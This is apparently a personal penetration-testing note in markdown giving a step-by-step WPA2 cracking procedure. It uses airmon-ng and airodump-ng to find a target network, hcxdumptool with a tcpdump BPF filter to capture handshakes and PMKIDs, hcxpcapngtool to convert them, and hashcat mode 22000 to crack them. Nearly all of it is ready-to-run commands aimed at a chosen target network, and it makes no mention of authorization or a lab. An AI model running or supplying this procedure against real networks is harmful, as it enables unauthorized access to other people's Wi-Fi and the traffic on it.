# Wi‑Fi WPA2 Hacking - hcxdumptool

## Metadata
- **BSSID:** MAC  (MAC-no-colons)
- **Channel:** 11
- **ESSID:** WIFI-NAME

## 🧠 S — Summary
Capture WPA2 authentication traffic (handshake/PMKIDs) from a target AP using `hcxdumptool`, convert captures to Hashcat format with `hcxpcapngtool`, and crack with Hashcat/other tools.

## 🧰 T — Tools
- `hcxdumptool` — capture tool for 802.11 (handshakes/PMKIDs)
- `hcxpcapngtool` — converts pcapng to `hash.hc22000` for Hashcat
- `airmon-ng`, `airodump-ng` — monitor mode helpers (from aircrack-ng)
- `tcpdump` — build BPF filters
- `NetworkManager` / `wpa_supplicant` — services to stop when capturing

## 💣 E — Exploits / Examples
Create a BPF file filtering frames for the target BSSID and broadcast:

```bash
sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <MAC> or wlan addr3 ffffffffffff" -ddd > attack.bpf
```

Use `hcxdumptool` to capture on the monitor interface (example uses channel 11):

```bash
# stop network services
sudo systemctl stop NetworkManager.service && sudo systemctl stop wpa_supplicant.service

# enable monitor mode
sudo airmon-ng start wlan0

# capture (example)
sudo hcxdumptool -i wlan0mon -c 11 --bpf=attack.bpf -w new_capture.pcapng

# (optional) add --rds=1 to show status/feedback
```

Convert the capture to Hashcat format:

```bash
hcxpcapngtool -o hash.hc22000 new_capture.pcapng
# or
hcxpcapngtool -o hash.hc22000 <dumpfile>.pcapng
```

Notes:
- Ensure the BPF uses the target BSSID (replace `MAC` with your target).

## ✏️ P — Practice Notes
- Write the target BSSID, channel, and ESSID before capturing.
- If `hcxdumptool` hangs on start:
    - `sudo systemctl stop NetworkManager`
    - `sudo systemctl stop wpa_supplicant`
    - `sudo airmon-ng check kill`
- After stopping services, re-run `hcxdumptool` and consider `--rds=1` for progress output.

- If `hcxpcapngtool` complains "no hashes to be written" (or similar), convert the `pcapng` using Hashcat's cap2hashcat converter: https://hashcat.net/cap2hashcat/ — upload the `.pcapng` and download the converted hash file.

## 🧾 S — Scripts / Snippets

### Step-by-step procedure

1. Enable monitor mode on the Wi‑Fi card:

```bash
sudo airmon-ng start wlan0
```

2. Verify the interface is in monitor mode:

```bash
iw dev
# look for wlan0mon (or similar)
```

3. Stop network services that interfere with capturing:

```bash
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
```

4. List nearby networks and note BSSID / ESSID / Channel:

```bash
sudo airodump-ng wlan0mon
# copy BSSID, CH, ESSID for target
```

5. Generate a BPF filter for the target (creates `attack.bpf`):

```bash
sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <BSSID_without_colons> or wlan addr3 ffffffffffff" -ddd > attack.bpf
# example: replace <BSSID_without_colons> with b0eabc13f820
```

6. Capture with `hcxdumptool` to produce a `.pcapng` file:

```bash
sudo hcxdumptool -i wlan0mon -c <CH> --bpf=attack.bpf -w new_capture.pcapng --rds=1
# replace <CH> with the target channel (e.g., 11)
```

7. Monitor the capture output — when you see a `+` in the `3` or `P` column, you likely have a valid handshake/PMKID; stop the capture to save the file.

8. Re-enable network services after capture:

```bash
sudo systemctl start NetworkManager.service
sudo systemctl start wpa_supplicant.service
```

9. Convert the `pcapng` capture to Hashcat format using `hcxpcapngtool`:

```bash
hcxpcapngtool -o hash.hc22000 new_capture.pcapng
```

10. Crack the resulting hash with Hashcat (example):

```bash
# WPA-PBKDF2 (Hashcat mode 22000)
hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt -w 3 --status
```

Replace interface names, filenames, and channel values to match your environment.

---
> Tip: Copy the S.T.E.P.S. template from `notes/README.md` for new notes to keep consistency.